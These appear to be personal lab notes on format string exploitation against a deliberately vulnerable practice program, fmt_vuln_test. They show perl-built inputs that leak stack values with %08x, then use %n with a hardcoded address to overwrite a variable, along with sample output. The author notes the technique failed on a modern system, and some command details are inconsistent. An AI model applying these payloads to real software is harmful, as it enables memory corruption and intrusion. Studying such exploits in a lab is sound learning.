```ad-todo
From my testing, this doesn't work on a modern system even with the flags I specified, I'm not sure why this could be. It requires more testing from me. #TODO
```

We can overwrite data at an address by doing the following:

First, we type:

```bash
./fmt_vuln_test `perl -e 'print "AAAA" . "%08x."x20'`
```

So we can find out where our first string in memory is stored, at what place. This is an example output with this program that you can check out at [[Format string read]]:

```
The right way to print user-controlled input:
AAAA%08x.%08x.%08x.%08x.
The wrong way to print user-controlled input:
AAAAffffc7a0.f7ffdb8c.080491d0.41414141.
[*] test_val @ 0x56559020 = -72 0xffffffb8
```

From this we can see that the hex representation of `AAAA` is `41414141`, and it’s on the 4th place.

We can also see the address of the test_val: `0x56559020`

So we can do the exploit now using `%n`.

```bash
./fmt_vuln_test `perl -e 'print "\x20\x90\x55\x56" . ".%08x"x3 . "%n"'`
```

Where we first print out the address of the thing we want to write to (since that is passed in as a first argument.)

Then we add 3 cases of `%.08x` after it, these format strings will __read__ the first 3 instances of data, then when we reach the fourth one, we __write__ to it with `%n`.

There is a trick to control how many bytes `%n` takes as an argument by using field with like so:

```bash
./fmt_vuln `perl -e 'print "\x20\x90\x55\x56" . "%x%100x%x" . "%n"'`
```

By manipulating this, we can easily reach a higher number that we overwrite with.

Sadly this __ONLY WORKS__ on smaller numbers and not on bigger ones like memory addresses.

```ad-note
Be careful to put the number in the right place.
```

[[Format string write address]]